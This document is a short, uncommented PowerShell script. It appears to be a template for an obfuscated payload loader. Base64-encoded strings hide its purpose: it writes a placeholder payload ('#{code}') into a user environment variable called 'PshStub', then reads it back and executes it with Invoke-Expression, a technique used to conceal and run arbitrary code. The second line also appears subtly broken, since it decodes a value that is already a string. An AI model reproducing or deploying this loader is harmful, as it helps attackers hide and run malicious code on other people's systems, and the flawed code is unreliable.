﻿[Environment]::SetEnvironmentVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABzAGgAUwB0AHUAYgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IwB7AGMAbwBkAGUAfQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))))
iex $($([Text.Encoding]::Unicode.GetString([Environment]::GetEnvironmentVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABzAGgAUwB0AHUAYgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))))))

